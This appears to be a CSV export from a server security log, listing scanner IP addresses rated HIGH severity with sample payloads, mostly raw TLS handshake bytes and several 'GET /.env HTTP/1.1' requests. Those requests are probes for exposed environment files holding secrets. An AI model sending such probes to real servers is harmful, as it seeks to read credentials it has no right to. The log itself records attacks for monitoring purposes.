IP,SEVERITY,COUNT,SAMPLE_PAYLOAD
167.94.146.49,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03"
170.64.147.133,HIGH,2,"GET /.env HTTP/1.1"
172.104.11.34,HIGH,2,"\x16\x03\x01\x01"
172.104.11.51,HIGH,2,"\x16\x03\x01\x01"
172.236.228.193,HIGH,2,"\x16\x03\x01\x01"
172.236.228.220,HIGH,2,"\x16\x03\x01\x01"
172.236.228.222,HIGH,2,"\x16\x03\x01\x01"
172.236.228.39,HIGH,2,"\x16\x03\x01\x01"
176.32.195.85,HIGH,2,"\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\"
178.128.242.42,HIGH,2,"GET /.env HTTP/1.1"
180.93.228.84,HIGH,2,"GET /.env HTTP/1.1"
180.93.230.246,HIGH,2,"GET /.env HTTP/1.1"
18.219.216.206,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD9\x8B\xE1#\xC6\xD7\xDAo\x86\x7F\x1F\x1E\xCD\x1Ab\x95\xA7\xE"
